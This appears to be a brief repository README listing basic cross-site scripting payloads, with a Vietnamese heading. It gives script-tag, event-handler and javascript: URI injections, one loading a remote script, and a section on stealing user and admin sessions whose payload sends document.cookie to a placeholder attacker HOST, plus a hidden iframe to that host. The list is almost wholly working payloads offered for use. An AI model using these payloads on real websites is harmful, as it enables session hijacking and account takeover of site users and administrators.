# xss-vulner
# Các payload xss cơ bản

##  With <script> tag:
 *<script>alert(1)</script>
  
  *<script src=//brutelogic.com.br/1.js></script>
##  With regular HTML tags:
 ### 2.1 Event-based:
    * <body onload=alert(1)>

    * <img src=1 onerror=alert(1)>

    * <svg onload=alert(1)>
    
    * <x onmouseover=alert(1)>
 ### 2.2 Resource-based:
    * <iframe src=javascript:alert(1)>
    
    * <object data=javascript:alert(1)>
    
    *<script>alert(document.domain)</script>
 ### 2.3 Steal an user session on the vulnerable website (including admins)
    * <svg onload=fetch('//HOST/?cookie='+document.cookie)>

    * <iframe src=//HOST/ style=display:none></iframe>
